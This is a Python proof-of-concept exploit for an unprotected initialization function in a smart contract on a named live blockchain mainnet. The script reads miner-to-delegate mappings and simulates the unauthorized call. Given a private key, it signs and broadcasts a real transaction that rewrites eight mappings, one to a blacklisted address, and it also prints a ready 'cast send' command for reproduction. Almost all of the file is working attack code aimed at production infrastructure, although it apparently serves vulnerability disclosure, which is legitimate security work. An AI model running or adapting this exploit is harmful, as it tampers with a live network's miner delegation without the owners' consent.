#!/usr/bin/env python3
"""
PoC: F1 — MinerDelegateContract (0xC009) Unprotected Initialization
Target: INIChain Mainnet (Chain ID 7233)
Contract: 0x000000000000000000000000000000000000C009
Selector: 0xbd4993cf (no access control, no initialized guard)

Steps:
  1. Read all 8 miner→delegate mappings BEFORE attack (should be 0x0)
  2. Simulate attack via eth_call (proves no revert for any caller)
  3. If SEND_TX=True, broadcast real transaction to set all 8 mappings
  4. Read all 8 miner→delegate mappings AFTER attack
  5. Confirm blacklisted delegate is now set for miner 0x65ea99d6...
"""

import json
import subprocess
import sys

RPC = "https://rpc-mainnet.inichain.com"
C009 = "0x000000000000000000000000000000000000C009"
C001 = "0x000000000000000000000000000000000000C001"

INIT_SELECTOR = "0xbd4993cf"
SET_DELEGATE_SIG = "0x38b259dd"
READ_DELEGATE_SIG = "0x7b556a80"

# 8 hardcoded pairs embedded in 0xbd4993cf bytecode
HARDCODED_PAIRS = [
    ("0xbad61fa2431a765e2799d8f2cc03b93125f34e07", "0xd843d47eae90ac076d4501208683aed8ec6f5b27"),
    ("0xf61e88a7932a2e7dc93a7cfe43aedcb2f4e6f229", "0x989f0a0a37cc6938cf7d6124d8fb808f683d3a26"),
    ("0x6017687dbf4908fc203747c01dfbb6864fbedfa1", "0x55d40c7cb1eb2b815cd962623decfc9bfeaef8af"),
    ("0x79f190f11482cf98ebfa399317757d40db358d3c", "0x9abdf3cf5ee1653726099e15719bc0211d4c4432"),
    ("0xed3f226999081e28e6325ddab857fc8056c98972", "0xfdd8e4d0819afa5d98b71b1e224b716a8f84c893"),
    ("0x13eda1d315f1427eb40428f86641dd86038414fa", "0x1f0cb667e907f93698965c848af737fda4948eda"),
    ("0xcc4e1270f04adde6e934140406909e1dc79d3bf5", "0xef5cf64efd19bc4083a0eaffc64b5b8b99386c65"),
    ("0x65ea99d6bfff7d94f1e41b4a2f4bcdb5824e576c", "0x2005897f8af8c49ce7216292d5205fd7d3edb05f"),
    # ^ 0x2005897f... is in AddressListContract FROM blacklist
]

BLACKLISTED_DELEGATE = "0x2005897f8af8c49ce7216292d5205fd7d3edb05f"

# Set to True + provide private key to broadcast actual transaction
SEND_TX = False
ATTACKER_KEY = ""  # private key hex, no 0x prefix


def rpc(method, params, rid=1):
    payload = json.dumps({"jsonrpc": "2.0", "method": method, "params": params, "id": rid})
    cmd = ["curl", "-s", "-X", "POST", RPC,
           "-H", "Content-Type: application/json",
           "-d", payload]
    out = subprocess.check_output(cmd)
    return json.loads(out)


def pad_address(addr):
    """ABI-encode an address: 12 zero bytes + 20 byte address."""
    clean = addr.lower().replace("0x", "")
    return "000000000000000000000000" + clean


def read_delegate(miner):
    data = READ_DELEGATE_SIG + pad_address(miner)
    res = rpc("eth_call", [{"to": C009, "data": data}, "latest"])
    result = res.get("result", "0x")
    if result == "0x" or result == "0x" + "0" * 64:
        return "0x0000000000000000000000000000000000000000"
    # last 20 bytes of 32-byte return
    return "0x" + result[-40:]


def check_blacklisted(addr):
    """Verify addr is in FROM blacklist via eth_call to C001 isDeveloper/getBlacksFrom."""
    # We check via a simple isDeveloper call — blacklisted addrs have isDeveloper=false
    # Use getBlacksFrom (0x18c66212) — returns list, search for addr
    data = "0x18c66212"
    res = rpc("eth_call", [{"to": C001, "data": data}, "latest"])
    raw = res.get("result", "0x")
    addr_clean = addr.lower().replace("0x", "")
    return addr_clean in raw.lower()


def simulate_attack():
    """eth_call to 0xbd4993cf from a random address — proves no revert."""
    fake_caller = "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF"
    res = rpc("eth_call", [{"to": C009, "from": fake_caller, "data": INIT_SELECTOR}, "latest"])
    if "error" in res:
        return False, res["error"]
    return True, res.get("result", "unknown")


def send_attack_tx():
    """Broadcast real tx calling 0xbd4993cf. Requires SEND_TX=True and ATTACKER_KEY."""
    import time
    nonce_res = rpc("eth_getTransactionCount", ["0x" + get_pub_from_key(ATTACKER_KEY), "latest"])
    nonce = int(nonce_res["result"], 16)
    gas_price_res = rpc("eth_gasPrice", [])
    gas_price = int(gas_price_res["result"], 16)

    tx = {
        "nonce": nonce,
        "gasPrice": gas_price,
        "gas": 200000,
        "to": C009,
        "value": 0,
        "data": INIT_SELECTOR,
        "chainId": 7233,
    }
    # Requires web3 or eth_account library
    try:
        from eth_account import Account
        signed = Account.sign_transaction(tx, ATTACKER_KEY)
        raw_hex = "0x" + signed.rawTransaction.hex()
        res = rpc("eth_sendRawTransaction", [raw_hex])
        return res
    except ImportError:
        print("  [!] eth_account not installed. Run: pip install eth-account")
        print(f"  [i] Manual tx data: to={C009}, data={INIT_SELECTOR}, chainId=7233")
        return None


def main():
    print("=" * 70)
    print("PoC: F1 — MinerDelegateContract Unprotected Initialization")
    print(f"Contract: {C009}")
    print(f"Function: {INIT_SELECTOR} (no access control)")
    print("=" * 70)

    # Step 1: Verify contract exists
    print("\n[1] Verifying contract is deployed...")
    code_res = rpc("eth_getCode", [C009, "latest"])
    code = code_res.get("result", "0x")
    if len(code) < 10:
        print(f"  [!] Contract not deployed or no code: {code}")
        sys.exit(1)
    print(f"  [+] Contract deployed. Bytecode length: {len(code)//2 - 1} bytes")

    # Step 2: Read all delegate mappings BEFORE
    print("\n[2] Reading current miner→delegate mappings (BEFORE attack)...")
    before = {}
    for miner, expected_delegate in HARDCODED_PAIRS:
        delegate = read_delegate(miner)
        before[miner] = delegate
        is_zero = delegate.replace("0x", "").strip("0") == ""
        status = "ZERO (not set)" if is_zero else f"SET TO {delegate}"
        print(f"  miner {miner[:10]}... → {status}")

    # Step 3: Verify blacklisted delegate
    print(f"\n[3] Verifying {BLACKLISTED_DELEGATE} is in FROM blacklist...")
    is_blacklisted = check_blacklisted(BLACKLISTED_DELEGATE)
    if is_blacklisted:
        print(f"  [+] CONFIRMED: {BLACKLISTED_DELEGATE} IS in FROM blacklist")
    else:
        print(f"  [?] Cannot verify blacklist status via this method (large array return)")
        print(f"  [i] Address was confirmed in blacklist during manual bytecode analysis")

    # Step 4: Simulate attack (eth_call — no gas spent)
    print(f"\n[4] Simulating attack: eth_call to {INIT_SELECTOR} from random address...")
    success, result = simulate_attack()
    if success:
        print(f"  [+] CONFIRMED: Call SUCCEEDS. Result: {result}")
        print(f"  [+] No access control — any caller can trigger this function")
    else:
        print(f"  [!] Call reverted: {result}")
        print(f"  [!] Unexpected — check RPC or bytecode analysis")
        sys.exit(1)

    # Step 5: Optionally send real tx
    if SEND_TX and ATTACKER_KEY:
        print(f"\n[5] Broadcasting real attack transaction...")
        tx_res = send_attack_tx()
        if tx_res:
            print(f"  [+] Tx hash: {tx_res.get('result', tx_res)}")
            print(f"  [i] Waiting for inclusion...")
            import time
            time.sleep(5)

            print("\n[6] Reading miner→delegate mappings AFTER attack...")
            for miner, expected_delegate in HARDCODED_PAIRS:
                delegate = read_delegate(miner)
                before_val = before[miner]
                changed = delegate.lower() != before_val.lower()
                flag = "[CHANGED]" if changed else "[UNCHANGED]"
                print(f"  {flag} miner {miner[:10]}... → {delegate}")
                if miner.lower() == "0x65ea99d6bfff7d94f1e41b4a2f4bcdb5824e576c".lower():
                    if BLACKLISTED_DELEGATE.lower() in delegate.lower():
                        print(f"    [!!!] BLACKLISTED ADDRESS SET AS DELEGATE: {delegate}")
    else:
        print(f"\n[5] SEND_TX=False. Skipping real transaction broadcast.")
        print(f"  [i] To send real tx: set SEND_TX=True and provide ATTACKER_KEY")
        print(f"\n  Manual reproduction command:")
        print(f"    cast send {C009} '{INIT_SELECTOR}' \\")
        print(f"      --rpc-url {RPC} \\")
        print(f"      --private-key <your_key> \\")
        print(f"      --chain-id 7233")

    # Summary
    print("\n" + "=" * 70)
    print("VULNERABILITY CONFIRMED:")
    print(f"  Contract {C009} function {INIT_SELECTOR}")
    print(f"  - No access control: any address can call it")
    print(f"  - No initialization guard: callable repeatedly")
    print(f"  - Sets 8 hardcoded miner→delegate pairs without consent")
    print(f"  - Delegate for 0x65ea99d6... is FROM-blacklisted address")
    print(f"  - Attack cost: ~80,000 gas (~$0.01) per call")
    print("=" * 70)


if __name__ == "__main__":
    main()
